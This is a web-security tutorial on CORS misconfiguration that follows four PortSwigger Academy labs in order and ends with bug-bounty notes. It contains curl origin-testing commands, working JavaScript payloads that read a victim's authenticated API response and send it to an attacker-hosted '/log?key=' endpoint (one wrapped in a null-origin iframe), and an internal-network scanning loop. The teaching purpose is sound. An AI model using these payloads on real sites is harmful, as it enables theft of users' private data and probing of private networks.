# 05 — CORS Misconfiguration

## What CORS is, briefly

The Same-Origin Policy (SOP) is the browser's default rule that JavaScript running on
`https://a.com` cannot read responses from `https://b.com`. Cross-Origin Resource Sharing (CORS)
is the mechanism that lets a server **deliberately relax** this rule for specific origins, by
returning headers like:

```
Access-Control-Allow-Origin: https://trusted-partner.com
Access-Control-Allow-Credentials: true
```

CORS misconfiguration is what happens when a server relaxes this rule too broadly — allowing
origins it should not trust to read sensitive, authenticated responses (API keys, personal data,
session-bound content) via cross-origin JavaScript requests.

This is one of the categories PortSwigger Web Security Academy models as its own dedicated
top-level topic, with four labs in a fixed, escalating order. This file walks through each
pattern in that exact Academy order.

## Pattern 1: Basic origin reflection

**The flaw:** Instead of validating the `Origin` header against an allow-list, the server simply
**reflects** whatever `Origin` it receives back into `Access-Control-Allow-Origin`, often
alongside `Access-Control-Allow-Credentials: true`. This means literally any website can read
the authenticated response, because the server will say "yes, your origin is allowed" to
anyone.

**How to test, piece by piece:**

```bash
curl -s -H "Origin: https://evil-test-domain.com" -i https://target.example.com/api/userinfo
```

- `-H "Origin: https://evil-test-domain.com"` — manually set the `Origin` request header to an
  arbitrary, clearly-untrusted domain you control or invent for testing.
- `-i` — include response headers so you can inspect what `Access-Control-Allow-Origin` comes
  back as.
- If the response's `Access-Control-Allow-Origin` header echoes back
  `https://evil-test-domain.com` exactly, and `Access-Control-Allow-Credentials: true` is also
  present, the endpoint is vulnerable to basic origin reflection.

**Exploit primitive (what you'd host on an attacker-controlled page):**

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function() { document.location = '/log?key=' + this.responseText; };
  req.open('GET', 'https://target.example.com/api/userinfo', true);
  req.withCredentials = true;
  req.send();
</script>
```

- `new XMLHttpRequest()` — creates a browser HTTP request object.
- `req.open('GET', '...', true)` — configures the request as an asynchronous (`true`) `GET` to
  the victim's API endpoint.
- `req.withCredentials = true` — this is the critical line: it tells the browser to **include**
  the victim's cookies/session for the target domain in the cross-origin request. Without this
  flag, the request would be sent without authentication and would not return the victim's
  private data.
- `req.send()` — fires the request. Because the victim's browser still holds a valid session
  cookie for `target.example.com`, and the server reflects the attacker's origin, the response
  (containing the victim's private API data) is readable by the attacker's own `onload` handler.

## Pattern 2: Trusted null origin

**The flaw:** The server's allow-list explicitly includes the literal string `null` as a trusted
origin — often added to support legacy or "no-origin" contexts (file:// pages, sandboxed iframes,
certain redirect chains) — without realizing that an attacker can deliberately force their own
page to send `Origin: null`.

**How to test:**

```bash
curl -s -H "Origin: null" -i https://target.example.com/api/userinfo
```

- Identical flag breakdown to Pattern 1's test, just with the `Origin` header literally set to
  the string `null`. If `Access-Control-Allow-Origin: null` comes back with credentials allowed,
  the server is vulnerable.

**Exploit primitive — forcing a `null` origin from an attacker page:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
  var req = new XMLHttpRequest();
  req.onload = function(){ document.location = '/log?key=' + this.responseText; };
  req.open('GET','https://target.example.com/api/userinfo',true);
  req.withCredentials = true;
  req.send();
</script>"></iframe>
```

- `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,...">` —
  a sandboxed iframe loaded from a `data:` URI (not a real HTTP(S) origin) automatically causes
  the browser to send `Origin: null` on any request made from within it. The `sandbox` attribute
  with `allow-scripts` permits the embedded script to still run despite the sandboxing.
- The inner `<script>` block is functionally identical to Pattern 1's exploit — it's the
  surrounding iframe/data-URI wrapper that forces the `null` origin value.

## Pattern 3: Trusted insecure protocols (subdomain trust regardless of protocol)

**The flaw:** The server's allow-list trusts an entire subdomain wildcard (e.g.,
`*.target.example.com`) **regardless of protocol**, including plain `http://`. If any subdomain
under that wildcard has an XSS vulnerability — or simply doesn't enforce HTTPS — an attacker can
use that subdomain as a stepping stone, since the CORS policy doesn't distinguish
`https://subdomain.target.example.com` from `http://subdomain.target.example.com`.

**How to test:**

```bash
curl -s -H "Origin: http://subdomain.target.example.com" -i https://target.example.com/api/userinfo
```

- Same structure as before, but this time supplying an `http://` (not `https://`) version of a
  legitimate-looking subdomain as the `Origin`. If the response trusts it, the policy is not
  protocol-aware.

**Exploitation in practice:** this pattern typically requires finding a genuine XSS bug on the
trusted `http://` subdomain (PortSwigger's own lab for this pattern is explicitly chained with an
XSS vulnerability on the trusted subdomain), since you need to actually run JavaScript from that
origin — you can't simply forge the `Origin` header from your own attacker-controlled domain and
expect the browser to comply; the header is set by the browser based on the page's real origin,
not attacker-supplied data, in any real exploitation (the `curl` test above is for confirming the
server-side policy only).

## Pattern 4: Internal network pivot via CORS

**The flaw:** A server trusts CORS requests from internal network ranges (e.g.,
`192.168.0.0/24`) under the assumption that only internal/trusted services can reach those
addresses. But if the *victim's browser* can be made to issue the request (rather than the
attacker's server directly), the attacker is effectively using the victim's browser as a network
pivot into a private network the attacker could never reach directly.

**Exploit primitive (recon phase — finding the internal service from the victim's browser):**

```html
<script>
  function scan(ip) {
    var img = new Image();
    img.src = 'http://' + ip + ':8080/';
    // timing/onerror analysis used to infer whether the host responds
  }
  for (var i = 1; i < 255; i++) {
    scan('192.168.0.' + i);
  }
</script>
```

- `new Image()` and setting `.src` is a classic cross-origin recon technique — it triggers a
  request to the given address without being blocked by CORS (image loads aren't subject to the
  same restriction as reading response *content* via XHR/fetch), and you can observe success via
  `onload`/`onerror` timing to fingerprint which internal IPs have something listening on the
  given port.
- The `for` loop sweeps a full `/24` address range (`192.168.0.1`–`192.168.0.254`) from inside the
  victim's browser — addresses the external attacker cannot reach directly, but the victim's
  browser, sitting inside the corporate network, can.
- Once a live internal host is found, a second-stage payload performs the actual
  `XMLHttpRequest` with `withCredentials = true` against that internal address, using the
  victim's browser/session as the relay.

## PortSwigger Web Security Academy lab mapping (correct Academy order)

| Order | Lab name | Pattern in this file |
|---|---|---|
| 1 | CORS vulnerability with basic origin reflection | Pattern 1 |
| 2 | CORS vulnerability with trusted null origin | Pattern 2 |
| 3 | CORS vulnerability with trusted insecure protocols | Pattern 3 |
| 4 | CORS vulnerability with internal network pivot attack | Pattern 4 |

This is the exact difficulty/Academy progression — each lab adds a layer of complexity onto the
previous one's core concept (reflection → trust-list edge cases → protocol-blind trust →
using the victim's network position as a pivot).

## Real-world notes

- CORS misconfiguration findings are extremely common and well-paid in bug bounty programs,
  especially against API-heavy SPAs, because a single misconfigured `Access-Control-Allow-Origin`
  + `Access-Control-Allow-Credentials: true` combination on a sensitive endpoint (account info,
  API keys, admin functionality) is a near-complete account takeover primitive with a simple
  proof-of-concept.
- A frequent real-world variant not covered by the four core labs above: regex-based origin
  validation that's subtly broken — e.g., a check like `origin.endsWith("target.com")` would
  incorrectly trust `https://evil-target.com`, and a check using an unescaped `.` in a regex
  (`/^https:\/\/.*\.target\.com$/`) can sometimes be bypassed with creative subdomain naming.
  Always test the allow-list logic itself, not just the four canonical patterns.
- The James Kettle ("albinowax") research referenced throughout the industry
  ("Exploiting CORS misconfigurations for Bitcoins and bounties") is considered the foundational
  public write-up for this entire vulnerability class and is worth reading directly for deeper
  context beyond what's reproduced here.

## What's next

Continue to `06_Directory_Listing_Exposure.md`.
